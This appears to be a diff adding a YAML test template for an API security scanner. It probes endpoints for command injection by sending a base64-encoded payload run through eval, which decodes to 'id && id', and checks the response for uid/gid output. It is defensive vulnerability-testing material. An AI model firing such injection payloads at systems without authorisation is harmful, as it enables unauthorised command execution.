@@ -1,0 +1,123 @@
+id: COMMAND_INJECTION_BASE64_ENCODING
+info:
+  name: "Command injection via base64 encoding with echo"
+  description: "This test is a technique where an attacker injects malicious commands into a system by encoding them in base64. The system decodes the base64 input and uses echo to process it, which can lead to the execution of the attacker's commands. This method exploits base64 encoding to bypass input validation and execute unauthorized commands."
+  details: >
+    "In this test, an attacker injects malicious commands into an application that uses base64 encoding and the echo command to handle input. By encoding their commands in base64, they can bypass input filters or validation. When the application decodes the base64 data and processes it with echo, it executes the injected commands, potentially compromising the system."
+  impact: "The impact of this test can be severe, as it allows attackers to execute arbitrary commands on the server. This can lead to unauthorized access, data breaches, or full system compromise. Additionally, it can bypass security measures that rely on filtering or validation of user input, escalating the risk of exploitation."
+  category:
+    name: COMMAND_INJECTION
+    shortName: Command Injection
+    displayName: Command Injection
+  subCategory: COMMAND_INJECTION_BASE64_ENCODING
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://twitter.com/trbughunters/status/1283133356922884096"
+  cwe:
+    - CWE-77
+  cve:
+    - CVE-2023-25826
+    - CVE-2023-41031
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    neq: "OPTIONS"
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  or:
+    - request_payload:
+        for_one:
+          key:
+            regex: .*
+            extract: changed_body_key
+          value:
+            extract: changed_body_value
+    - query_param:
+        for_one:
+          key:
+            regex: .*
+            extract: changed_query_key
+          value:
+            regex: .*
+            extract: changed_query_value
+wordLists:
+  specialOSPayloads:
+    - "eval \"$(echo \"aWQgJiYgaWQ=\" | base64 --decode)\""
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_body_param: 
+            changed_body_key:  ${specialOSPayloads}
+        - modify_query_param:
+            changed_query_key:  ${specialOSPayloads}
+validate:
+  response_payload:
+    length:
+      gt: 0
+    contains_all:
+      - "uid="
+      - "gid="
+      - "groups="
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
